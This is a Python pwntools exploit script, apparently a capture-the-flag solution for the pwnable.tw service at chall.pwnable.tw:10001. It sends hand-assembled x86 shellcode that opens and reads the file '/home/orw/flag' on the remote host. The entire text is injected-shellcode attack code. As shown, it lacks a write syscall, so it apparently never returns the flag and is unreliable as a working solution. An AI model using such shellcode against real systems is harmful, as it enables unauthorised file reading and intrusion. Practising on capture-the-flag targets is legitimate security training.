# coding = utf-8
# author = Mr.BeanX

from pwn import *

host = 'chall.pwnable.tw'
port = 10001

shellcode = ''

shellcode += asm('xor ecx,ecx;mov eax,0x5; push ecx;push 0x67616c66; push 0x2f77726f; push 0x2f656d6f; push 0x682f2f2f; mov ebx,esp;xor edx,edx;int 0x80;')

shellcode += asm('mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov dl,0x30;int 0x80;')

def exp():
    p = remote(host,port)
    p.recv()
    p.send(shellcode)
    print p.recv()

exp()
